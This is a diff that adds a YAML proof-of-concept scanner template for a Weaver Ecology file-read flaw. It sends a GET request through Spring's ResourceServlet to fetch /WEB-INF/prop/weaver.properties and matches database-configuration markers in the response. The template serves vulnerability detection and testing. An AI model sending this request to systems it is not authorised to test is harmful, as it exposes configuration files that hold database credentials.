@@ -1,0 +1,11 @@
+name: poc-yaml-weaver-ecology-read-config
+rules:
+  - method: GET
+    path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties
+    follow_redirects: true
+    expression:
+      response.status == 200 && response.body.bcontains(b"ecology.url") && response.body.bcontains(b"DriverClasses")
+detail:
+  author: sakura404x
+  links:
+    - https://www.cnblogs.com/KHZ521/p/14017940.html
